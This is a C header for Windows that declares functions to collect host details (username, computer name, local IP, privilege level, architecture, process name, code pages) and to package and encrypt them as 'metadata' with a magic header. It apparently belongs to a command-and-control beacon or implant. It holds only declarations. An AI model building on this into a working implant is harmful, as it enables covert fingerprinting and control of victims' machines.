#pragma once
#include <stdio.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#pragma warning(disable:4996) 

typedef struct {
    uint8_t* MakeMeta;
    size_t MakeMetaLen;
} MakeMetaInfoResult;

typedef struct {
    unsigned char* EncryMetadata;
    DWORD EncryMetadataLen;
} EncryMetadataResult;


MakeMetaInfoResult MakeMetaInfo();
EncryMetadataResult EncryMetadata();
bool IsHighPriv();
bool IsOSX64();
bool IsProcessX64();
int  GetMetaDataFlag();
unsigned char* GetOSVersion();
uint32_t GetLocalIPInt();
char* GetComputerNameAsString();
char* GetUsername();
char* GetProcessName();
unsigned char* GetCodePageANSI(size_t* bytesWritten);
unsigned char* GetCodePageOEM(size_t* bytesWritten);
uint8_t* GetMagicHead(uint8_t* MagicHead);